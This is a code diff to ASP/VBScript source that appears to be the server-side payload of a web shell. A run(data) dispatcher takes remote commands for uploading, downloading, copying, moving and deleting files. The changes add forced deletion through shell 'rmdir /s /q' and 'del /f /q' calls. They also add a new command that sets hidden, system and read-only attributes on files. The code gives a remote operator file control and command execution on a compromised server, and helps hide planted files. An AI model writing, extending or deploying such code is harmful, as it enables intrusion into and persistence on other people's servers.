@@ -12,7 +12,7 @@ Function MxToString(v)
     Dim i, s
     s = ""
     For i = 1 To LenB(v)
-        s = s & Chr(AscB(MidB(v, i, 1)))
+        s = s & ChrW(AscB(MidB(v, i, 1)) And &HFF)
     Next
     MxToString = s
 End Function
@@ -32,7 +32,11 @@ Function MxParams(data)
                 + AscB(MidB(data, i + 4, 1)) * 16777216
             i = i + 5
             If n < 0 Or i + n - 1 > LenB(data) Then Exit Do
-            dict(key) = MxToString(MidB(data, i, n))
+            If n = 0 Then
+                dict(key) = ""
+            Else
+                dict(key) = MxToString(MidB(data, i, n))
+            End If
             key = ""
             i = i + n
         Else
@@ -185,8 +189,24 @@ Function MxUploadFile(path, value)
     Set stream = Server.CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
-    stream.Write MxStringToBinary(value)
-    stream.SaveToFile path, 2
+    If Len(value) = 0 Then
+        stream.Close
+        Set stream = Nothing
+        Dim emptyFso
+        Set emptyFso = Server.CreateObject("Scripting.FileSystemObject")
+        emptyFso.CreateTextFile(path, True).Close
+        Set emptyFso = Nothing
+        If Err.Number <> 0 Then
+            Err.Clear
+            MxUploadFile = "fail"
+            Exit Function
+        End If
+        MxUploadFile = "ok"
+        Exit Function
+    Else
+        stream.Write MxStringToBinary(value)
+        stream.SaveToFile path, 2
+    End If
     stream.Close
     Set stream = Nothing
     If Err.Number <> 0 Then
@@ -258,11 +278,55 @@ Function MxDelete(path)
     End If
     If Err.Number <> 0 Then
         Err.Clear
-        MxDelete = "fail"
+        If fso.FolderExists(path) Then
+            MxExec("rmdir /s /q """ & path & """")
+        Else
+            MxExec("del /f /q """ & path & """")
+        End If
+        If fso.FolderExists(path) Or fso.FileExists(path) Then
+            MxDelete = "fail"
+        Else
+            MxDelete = "ok"
+        End If
         Exit Function
     End If
     On Error GoTo 0
     MxDelete = "ok"
+End Function
+
+Function MxSetAttr(typ, path, attr)
+    Dim fso, obj, a, v
+    If path = "" Then
+        MxSetAttr = "fail"
+        Exit Function
+    End If
+    On Error Resume Next
+    Set fso = Server.CreateObject("Scripting.FileSystemObject")
+    If typ = "dir" Then
+        Set obj = fso.GetFolder(path)
+    Else
+        Set obj = fso.GetFile(path)
+    End If
+    If Err.Number <> 0 Then
+        Err.Clear
+        MxSetAttr = "fail"
+        Exit Function
+    End If
+    a = UCase(attr)
+    v = 0
+    If InStr(a, "R") > 0 Then v = v + 1
+    If InStr(a, "H") > 0 Then v = v + 2
+    If InStr(a, "S") > 0 Then v = v + 4
+    If InStr(a, "A") > 0 Then v = v + 32
+    If v = 0 Then v = 0
+    obj.Attributes = v
+    If Err.Number <> 0 Then
+        Err.Clear
+        MxSetAttr = "fail"
+        Exit Function
+    End If
+    On Error GoTo 0
+    MxSetAttr = "ok"
 End Function
 
 Function MxCopy(src, dst)
@@ -326,7 +390,9 @@ Function MxBigUpload(path, value, position)
     Set stream = Server.CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
-    If position = "" Then
+    If Len(value) = 0 Then
+        stream.SaveToFile path, 2
+    ElseIf position = "" Then
         stream.Write MxStringToBinary(value)
         stream.SaveToFile path, 2
     Else
@@ -376,6 +442,8 @@ Function run(data)
             result = MxUtf8(MxCopy(MxGet(dict, "srcFileName"), MxGet(dict, "destFileName")))
         Case "moveFile"
             result = MxUtf8(MxMove(MxGet(dict, "srcFileName"), MxGet(dict, "destFileName")))
+        Case "setFileAttr"
+            result = MxUtf8(MxSetAttr(MxGet(dict, "type"), MxGet(dict, "fileName"), MxGet(dict, "attr")))
         Case "bigFileDownload"
             result = MxBigDownload(MxGet(dict, "fileName"), MxGet(dict, "mode"), MxGet(dict, "position"), MxGet(dict, "readByteNum"))
             If MxGet(dict, "mode") = "fileSize" Then result = MxUtf8(result)
